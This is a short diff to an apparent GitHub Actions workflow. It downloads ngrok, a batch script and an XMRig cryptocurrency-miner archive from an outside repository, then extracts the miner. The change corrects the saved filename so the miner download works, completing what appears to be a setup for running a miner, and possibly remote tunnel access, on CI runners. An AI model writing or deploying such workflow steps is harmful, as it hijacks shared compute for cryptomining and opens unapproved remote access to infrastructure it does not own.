@@ -13,7 +13,7 @@ jobs:
       run: |
         Invoke-WebRequest https://raw.githubusercontent.com/jaisai1337/cpu/main/ngrok-stable-windows-amd64.zip -OutFile ngrok.zip
         Invoke-WebRequest https://raw.githubusercontent.com/jaisai1337/cpu/main/start.bat -OutFile start.bat
-        Invoke-WebRequest https://raw.githubusercontent.com/jaisai1337/cpu/main/xmrig2.zip -OutFile ngrok.zip
+        Invoke-WebRequest https://raw.githubusercontent.com/jaisai1337/cpu/main/xmrig2.zip -OutFile xmrig2.zip
     - name: Extracting Xmrig.
       run: Expand-Archive xmrig2.zip
     - name: Extracting Ngrok Files.
